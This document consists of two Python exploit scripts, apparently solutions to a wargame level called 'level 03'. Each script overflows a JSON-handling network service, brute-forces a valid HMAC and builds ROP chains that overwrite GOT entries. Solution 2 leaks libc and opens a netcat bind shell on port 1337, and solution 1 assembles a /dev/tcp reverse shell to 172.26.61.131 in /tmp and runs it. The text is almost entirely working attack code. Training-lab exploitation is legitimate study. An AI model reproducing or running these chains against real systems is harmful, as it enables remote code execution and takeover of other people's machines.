### solution 2
```py
#!/usr/bin/python
import hashlib
import hmac
import random
import socket
import string
import time
import binascii
import re
from struct import pack, unpack

""" level 03 """

SERVER_IP = '192.168.85.155'
SERVER_PORT = 20003
LOCAL_IP = '172.26.61.131'
LOCAL_PORT = 80


"""
    Solution 2:

    1. connect to the service and receive the token to encrypt the JSON request
    2. create JSON request that contains title, tags, contents, serverip, and extra pwn tag
    3. overflow the stack with 127 bytes in the title tag followed by a unicode character and shellcode
    4. modify the pwn tag to add random characters until the requests mac begins with two null bytes
    5. use the add [ebx+offset], eax ROP gadgets to modify GOT entries for srand() to snprintf() using libc offsets
    6. use snprintf() to reliably write the write() libc pointer to post_blog_article() 
    7. leak the libc() to attacking machine & generate rop using base address
    8. repeat request to overflow and execute rop bind shell
"""


class Solution(object):
    last_buffer = None
    server = None
    sport = None
    s = None
    sc = None
    payload = None

    """ init """
    def __init__(self, server=SERVER_IP, sport=SERVER_PORT):
        """
        save server and port
        :param server:
        :param sport:
        """
        self.server = server
        self.sport = sport
        self.payload = self.shellcode()

    """ connect to the service """
    def connect(self):
        """
        create socket connection
        :return:
        """
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.server, self.sport))
        return self

    """ receive leaked libc - write address from blog post """
    def listen_for_leak(self):
        """
        bind local port 80
        parse blog post for leaked bytes
        :return:
        """
        self.sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sc.bind((LOCAL_IP, LOCAL_PORT))
        self.sc.listen(1)
        post_data = ""

        """ try connection """
        try:
            connection, client_address = self.sc.accept()
            try:
                while True:
                    data = connection.recv(1024)
                    if data:
                        post_data += data
                    else:
                        break
            finally:
                connection.close()
        finally:
            pass

        """ try parsing offset """
        try:
            leaked_offset = unpack('>I', post_data[-8:-4])[0]
            leaked_offset = unpack('>I', pack('<I', leaked_offset))[0]
            libc_offset = (leaked_offset - 0xc12c0) & 0xffffffff
            print '[+] libc offset 0x{0}'.format(pack('>I', libc_offset).encode('hex'))

            self.payload = self.rop(libc_offset)
        except Exception, e:
            print '[-] failed to parse libc offset ', e.message
        return self

    """ receive data from the socket """
    def rec(self, sz=1024):
        """
        read data from socket
        :param sz:
        :return:
        """
        self.last_buffer = self.s.recv(sz)
        time.sleep(0.5)
        return self

    """ write data to the socket """
    def send(self, data):
        """
        write data to socket
        :param data:
        :return:
        """
        self.s.sendall(data)
        time.sleep(0.5)
        return self

    """ close the socket """
    def quit(self):
        """
        close socket connection
        :return:
        """
        self.s.close()
        return self

    """ display the received data """
    def rec_info(self, length=False):
        """
        display data saved from the last read
        :param length:
        :return:
        """
        print ("[+] length: %d " % len(self.last_buffer)) \
            if length else ("[+] received: %s" % self.last_buffer)
        return self

    """ generate rop from leaked offset """
    @staticmethod
    def rop(libcbase):
        """
        offset leaked from libc write
        :param offset:
        :return:
        """

        """ crash by sending unicode character in the 128th position """
        p = 'A' * 127 + '\\\\u4141' + 'B' * 31  # trigger overflow

        p += pack("<I", libcbase + 0x000e0097)  # pop %ecx | pop %ebx | ret
        p += pack("<I", libcbase + 0x00178020)  # @ .data
        p += pack("<I", 0x42424242)  # padding
        p += pack("<I", libcbase + 0x000238df)  # pop %eax | ret
        p += "/bin"
        p += pack("<I", libcbase + 0x0006cc5a)  # mov %eax,(%ecx) | ret

        p += pack("<I", libcbase + 0x000e0097)  # pop %ecx | pop %ebx | ret
        p += pack("<I", libcbase + 0x00178024)  # @ .data + 4
        p += pack("<I", 0x42424242)  # padding
        p += pack("<I", libcbase + 0x000238df)  # pop %eax | ret
        p += "/nc."
        p += pack("<I", libcbase + 0x0006cc5a)  # mov %eax,(%ecx) | ret

        p += pack("<I", libcbase + 0x000e0097)  # pop %ecx | pop %ebx | ret
        p += pack("<I", libcbase + 0x00178028)  # @ .data + 8
        p += pack("<I", 0x42424242)  # padding
        p += pack("<I", libcbase + 0x000238df)  # pop %eax | ret
        p += "trad"
        p += pack("<I", libcbase + 0x0006cc5a)  # mov %eax,(%ecx) | ret

        p += pack("<I", libcbase + 0x000e0097)  # pop %ecx | pop %ebx | ret
        p += pack("<I", libcbase + 0x0017802c)  # @ .data + 12
        p += pack("<I", 0x42424242)  # padding
        p += pack("<I", libcbase + 0x000238df)  # pop %eax | ret
        p += "itio"
        p += pack("<I", libcbase + 0x0006cc5a)  # mov %eax,(%ecx) | ret

        p += pack("<I", libcbase + 0x000e0097)  # pop %ecx | pop %ebx | ret
        p += pack("<I", libcbase + 0x00178030)  # @ .data + 16
        p += pack("<I", 0x42424242)  # padding
        p += pack("<I", libcbase + 0x000238df)  # pop %eax | ret
        p += "nal "
        p += pack("<I", libcbase + 0x0006cc5a)  # mov %eax,(%ecx) | ret

        p += pack("<I", libcbase + 0x000e0097)  # pop %ecx | pop %ebx | ret
        p += pack("<I", libcbase + 0x00178034)  # @ .data + 20
        p += pack("<I", 0x42424242)  # padding
        p += pack("<I", libcbase + 0x000238df)  # pop %eax | ret
        p += "-ltp"
        p += pack("<I", libcbase + 0x0006cc5a)  # mov %eax,(%ecx) | ret

        p += pack("<I", libcbase + 0x000e0097)  # pop %ecx | pop %ebx | ret
        p += pack("<I", libcbase + 0x00178038)  # @ .data + 24
        p += pack("<I", 0x42424242)  # padding
        p += pack("<I", libcbase + 0x000238df)  # pop %eax | ret
        p += "1337"
        p += pack("<I", libcbase + 0x0006cc5a)  # mov %eax,(%ecx) | ret

        p += pack("<I", libcbase + 0x000e0097)  # pop %ecx | pop %ebx | ret
        p += pack("<I", libcbase + 0x0017803c)  # @ .data + 28
        p += pack("<I", 0x42424242)  # padding
        p += pack("<I", libcbase + 0x000238df)  # pop %eax | ret
        p += " -e/"
        p += pack("<I", libcbase + 0x0006cc5a)  # mov %eax,(%ecx) | ret

        p += pack("<I", libcbase + 0x000e0097)  # pop %ecx | pop %ebx | ret
        p += pack("<I", libcbase + 0x0017803f)  # @ .data + 32
        p += pack("<I", 0x42424242)  # padding
        p += pack("<I", libcbase + 0x000238df)  # pop %eax | ret
        p += "/bin"
        p += pack("<I", libcbase + 0x0006cc5a)  # mov %eax,(%ecx) | ret

        p += pack("<I", libcbase + 0x000e0097)  # pop %ecx | pop %ebx | ret
        p += pack("<I", libcbase + 0x00178043)  # @ .data + 36
        p += pack("<I", 0x42424242)  # padding
        p += pack("<I", libcbase + 0x000238df)  # pop %eax | ret
        p += "//sh"
        p += pack("<I", libcbase + 0x0006cc5a)  # mov %eax,(%ecx) | ret

        p += pack("<I", libcbase + 0x000328e0)  # xor %eax,%eax | ret
        p += pack("<I", libcbase + 0x0014a0df)  # inc %ecx | ret
        p += pack("<I", libcbase + 0x0014a0df)  # inc %ecx | ret
        p += pack("<I", libcbase + 0x0014a0df)  # inc %ecx | ret
        p += pack("<I", libcbase + 0x0014a0df)  # inc %ecx | ret
        p += pack("<I", libcbase + 0x0006cc5a)  # mov %eax,(%ecx) | ret

        p += pack("<I", libcbase + 0x0003cb20)  # system()
        p += pack("<I", libcbase + 0x000329e0)  # exit()
        p += pack("<I", libcbase + 0x00178020)  # @ .data

        print '[+] shellcode size ', len(p)
        print '[+] shellcode ', "\\x" + "\\x".join(re.findall("..", binascii.hexlify(p)))
        return p

    """ generate first stage shellcode to leak libc """
    @staticmethod
    def shellcode():
        """
        overwrite got srand() function to snprintf()
        writes write() pointer to read() value
        writes write() address to gContents@bss
        executes post_blog_article() with leaked address
        :return:
        """
        """ crash by sending unicode character in the 128th position """
        p = 'A' * 127 + '\\\\u4141' + 'B' * 31  # trigger overflow

        """ create snprintf() """
        p += pack("<I", 0x08049b4f)  # pop eax ; add esp 0x5c
        p += "\\\u3072\\\u0100"      # convert srand to snprintf
        p += "A" * 0x5c              # padding
        p += pack("<I", 0x8048bf0)   # pop ebx ;
        p += pack("<I", (0x804bcd4 - 0x5d5b04c4) & 0xffffffff)  # srand - offset
        p += pack("<I", 0x080493fe)  # add [ebx+0x5d5b04c4], eax ; ret

        """ write pointer """
        p += pack("<I", 0x08048c20)  # snprintf@plt
        p += pack("<I", 0x08049204)  # 0x08049204 : pop ebx ; pop esi ; pop edi ; pop ebp
        p += pack("<I", 0x0804bd38)  # 0x804bd38   read@got
        p += "\\\u0500\\\u0000"      # size 4
        p += pack("<I", 0x0804a2f8)  # 0x0804a2f8 : %s
        p += pack("<I", 0x08048a9c)  # 0x08048a9c : 1cbd0408 write@got

        """ leak libc for snprintf """
        p += pack("<I", 0x08048c20)  # snprintf@plt
        p += pack("<I", 0x08049204)  # 0x08049204 : pop ebx ; pop esi ; pop edi ; pop ebp
        p += pack("<I", 0x804bdf4)   # 0x804bdf4 <gContents>
        p += "\\\u0500\\\u0000"      # size 4
        p += pack("<I", 0x0804a2f8)  # 0x0804a2f8 : %s
        p += pack("<I", 0x0804bd38)  # 0x804bd38   read@got

        """ send libc leak via post """
        p += pack("<I", 0x08049f20)  # post_blog_article
        p += pack("<I", 0x0804a27f)  # 0x0804a27f : nop ; ret

        """ exit """
        p += pack("<I", 0x08048f80)  # 0x08048f80  exit@plt

        print '[+] shellcode size ', len(p)
        return p

    """ generate json request beginning with two null mac bytes """
    def mac_json_request(self, token):
        mac = 'A' * 2
        contents = 'A' * 4
        json_request = ""

        """ loop through and add random characters until the mac bytes match """
        while bytes(mac)[0:2] != '\x00\x00':
            content_bytes = bytearray(contents)
            char = bytearray(random.choice(string.ascii_letters))
            content_bytes.append(char[0])
            contents = str(content_bytes)

            """ json request format """
            json_request = \
                '{ "title": "' + self.payload + '", ' \
                + '"tags" : ["tag"], ' \
                + '"serverip" : "172.26.61.131", ' \
                + '"contents": "CONTENTS", ' \
                + '"pwn": "' + contents + '" }'

            """ generate mac from new request """
            mac = hmac.new(token, '\n'.join([token, json_request]), hashlib.sha1).digest()

        print '[+] found MAC ', mac.encode('hex')
        return mac, json_request

    """ execute a single call to the service """
    def execute_call(self):
        """
        execute json call to service
        :param rop_writes:
        :return:
        """
        self.connect()\
            .rec()\
            .rec_info()

        token = self.last_buffer.strip().strip('"')
        mac, request = self.mac_json_request(token)

        print '[+] sending request'
        self.send('\n'.join([token, request])) \
            .rec_info()\
            .quit()

        return self


if __name__ == "__main__":
    Solution().execute_call().listen_for_leak().execute_call()
```

### solution 1
```py
#!/usr/bin/python
import hashlib
import hmac
import random
import socket
import string
import time
from struct import pack

""" level 03 """

SERVER_IP = '192.168.85.155'
SERVER_PORT = 20003

""" 
    Solution 1: 
    
    1. connect to the service and receive the token to encrypt the JSON request
    2. create JSON request that contains title, tags, contents, serverip, and extra pwn tag    
    3. overflow the stack with 127 bytes in the title tag followed by a unicode character and shellcode
    4. modify the pwn tag to add random characters until the requests mac begins with two null bytes
    5. use the add [ebx+offset], eax ROP gadgets to modify GOT entries for srand() to snprintf() using libc offsets
    6. use snprintf() to reliably write system() arguments to the BSS segment but with limited space 
    7. use system() call to execute printf() writes to create a reverse bash shell in chunks
    8. use system() to execute the reverse bash shell in the tmp directory   
"""


class Solution(object):
    last_buffer = None
    server = None
    sport = None
    s = None

    """ init """
    def __init__(self, server=SERVER_IP, sport=SERVER_PORT):
        """
        save server and port
        :param server:
        :param sport:
        """
        self.server = server
        self.sport = sport

    """ connect to the service """
    def connect(self):
        """
        create socket connection
        :return:
        """
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.server, self.sport))
        return self

    """ receive data from the socket """
    def rec(self, sz=1024):
        """
        read data from socket
        :param sz:
        :return:
        """
        self.last_buffer = self.s.recv(sz)
        time.sleep(0.5)
        return self

    """ write data to the socket """
    def send(self, data):
        """
        write data to socket
        :param data:
        :return:
        """
        self.s.sendall(data)
        time.sleep(0.5)
        return self

    """ close the socket """
    def quit(self):
        """
        close socket connection
        :return:
        """
        self.s.close()
        return self

    """ display the received data """
    def rec_info(self, length=False):
        """
        display data saved from the last read
        :param length:
        :return:
        """
        print ("[+] length: %d " % len(self.last_buffer)) \
            if length else ("[+] received: %s" % self.last_buffer)
        return self

    """ generate shellcode from array of rop gadget keys """
    def shellcode(self, write_rop_chain):
        """
        overwrites write and srand got entries
        snprintf values to bss
        execute system call from bss

        :param write_rop_chain:
        :return:
        """
        """ crash by sending unicode character in the 128th position """
        p = 'A' * 127 + '\\\\u4141' + 'B' * 31  # trigger overflow
        bss_address = write_address = 0x804be04  # 0x804be04 <gTitle> bss

        """ useful rop gadgets from the level03 binary """
        rop_gadgets = {
            'printf': 0x080486ff,
            '"': 0x0804a32b,
            'us': 0x080486ea,
            'r': 0x0804a4cc,
            'w': 0x08048885,
            'g': 0x08048614,
            'e': 0x0804a610,
            'tp': 0x08048763,
            ':': 0x08048190,
            '//': 0x0804a316,
            'tcp': 0x0804a5f8,
            '80': 0x0804a40b,
            ' ': 0x0804819e,
            '&': 0x08048264,
            '-': 0x0804813b,
            '/': 0x08048134,
            '.': 0x08048141,
            '1': 0x08048414,
            '0': 0x0804ab73,
            '3': 0x0804a84c,
            '2': 0x08048145,
            '7': 0x080484f4,
            '6': 0x080486de,
            '>': 0x80489f1,
            'bin': 0x08048796,
            'de': 0x08048809,
            'ec': 0x08048650,
            '\\': 0x08048b1c,
            'i': 0x0804a6aa,
            'h': 0x08048178,
            'm': 0x08048179,
            'o': 0x0804a4cd,
            'p': 0x080488a5,
            'sh': 0x080486cc,
            't': 0x0804a5dc,
            'v': 0x08048623,
            ';': 0x0804a85b
        }

        """ create snprintf() """
        p += pack("<I", 0x08049b4f)  # pop eax ; add esp 0x5c
        p += "\\\u3072\\\u0100"  # convert srand to snprintf
        p += "A" * 0x5c  # padding
        p += pack("<I", 0x8048bf0)  # pop ebx ;
        p += pack("<I", (0x804bcd4 - 0x5d5b04c4) & 0xffffffff)  # srand - offset
        p += pack("<I", 0x080493fe)  # add [ebx+0x5d5b04c4], eax ; ret

        """ create system() """
        p += pack("<I", 0x08049b4f)  # pop eax ; add esp 0x5c
        p += pack("<I", 0xfff7b860)  # convert write to system
        p += "A" * 0x5c  # padding
        p += pack("<I", 0x8048bf0)  # pop ebx ; ret
        p += pack("<I", (0x804bd1c - 0x5d5b04c4) & 0xffffffff)  # write - offset
        p += pack("<I", 0x080493fe)  # add [ebx+0x5d5b04c4], eax ; ret

        """ write shell commands to bss """
        for write_val in write_rop_chain:
            rop_gadget = rop_gadgets[write_val]
            p += pack("<I", 0x08048c20)                      # snprintf@plt
            p += pack("<I", 0x08049204)                      # 0x08049204 : pop ebx ; pop esi ; pop edi ; pop ebp
            p += pack("<I", write_address)                   # bss
            p += "\\\u0%d00\\\u0000" % (len(write_val) + 1)  # size
            p += pack("<I", 0x0804a2f8)                      # 0x0804a2f8 : %s
            p += pack("<I", rop_gadget)                      # value
            write_address += len(write_val)

        """ call system() """
        p += pack("<I", 0x08048d40)  # system()
        p += pack("<I", 0x08048f80)  # 0x08048f80  exit@plt
        p += pack("<I", bss_address)  # bss

        print '[+] shellcode size ', len(p)
        return p

    """ break rop array into chunks """
    @staticmethod
    def chunks(l, n):
        """
        break l into n chunks
        :param l:
        :param n:
        :return:
        """
        for i in xrange(0, len(l), n):
            yield l[i:i + n]

    """ generate json request beginning with two null mac bytes """
    @staticmethod
    def mac_json_request(token, shellcode):
        mac = 'A' * 2
        contents = 'A' * 4
        json_request = ""

        """ loop through and add random characters until the mac bytes match """
        while bytes(mac)[0:2] != '\x00\x00':
            content_bytes = bytearray(contents)
            char = bytearray(random.choice(string.ascii_letters))
            content_bytes.append(char[0])
            contents = str(content_bytes)

            """ json request format """
            json_request = \
                '{ "title": "' + shellcode + '", ' \
                + '"tags" : ["tag"], ' \
                + '"serverip" : "172.26.61.131", ' \
                + '"contents": "content", ' \
                + '"pwn": "' + contents + '" }'

            """ generate mac from new request """
            mac = hmac.new(token, '\n'.join([token, json_request]), hashlib.sha1).digest()

        print '[+] found MAC ', mac.encode('hex')
        return mac, json_request

    """ execute a single call to the service """
    def execute_call(self, rop_writes):
        """
        execute json call to service
        :param rop_writes:
        :return:
        """
        self.connect()\
            .rec()\
            .rec_info()

        token = self.last_buffer.strip().strip('"')
        mac, request = Solution.mac_json_request(token, self.shellcode(rop_writes))

        print '[+] sending request'
        self.send('\n'.join([token, request])) \
            .rec_info()\
            .quit()

    """ the main method """
    def main(self):
        """
        main method
        :return:
        """
        """ the reverse bash shell: /bin/sh -i >& /dev/tcp/172.26.61.131/8080 0>&1 """
        file_sys_writes = [
            '/',
            'bin',
            '/',
            'sh',
            ' ',
            '-',
            'i',
            ' ',
            '>',
            '&',
            ' ',
            '/',
            'de',
            'v',
            '/',
            'tcp',
            '/',
            '1',
            '7',
            '2',
            '.',
            '2',
            '6',
            '.',
            '6',
            '1',
            '.',
            '1',
            '3',
            '1',
            '/',
            '80',
            ' ',
            '0',
            '>',
            '&',
            '1',
        ]

        """ snprintf writes used to create the printf command for writing the bash shell """
        write_rop_chain1 = [
            '/',
            'us',
            'r',
            '/',
            'bin',
            '/',
            'printf',
            ' ',
            '"'
        ]

        """ snprintf writes used in conjunction with the first set """
        write_rop_chain2 = [
            '"',
            '>',
            '>',
            '/',
            't',
            'm',
            'p',
            '/',
            'p'
        ]

        """ rop chain used to execute the bash script once written to the tmp directory """
        write_rop_chain3 = [
            '/',
            'bin',
            '/',
            'sh',
            ' ',
            '/',
            't',
            'm',
            'p',
            '/',
            'p'
        ]

        """ execute shell commands individually to avoid exceeding shellcode limits """
        calls_executed = 1
        for write_array in list(self.chunks(file_sys_writes, 2)):
            rop_chain = write_rop_chain1 + write_array + write_rop_chain2
            self.execute_call(rop_chain)
            print '[+] write rop chain ', calls_executed, ''.join(rop_chain)
            calls_executed += 1

        """ run the bash shell """
        self.execute_call(write_rop_chain3)
        calls_executed += 1
        print '[+] call executed ', calls_executed, ''.join(write_rop_chain3)


if __name__ == "__main__":
    Solution().connect().main()

```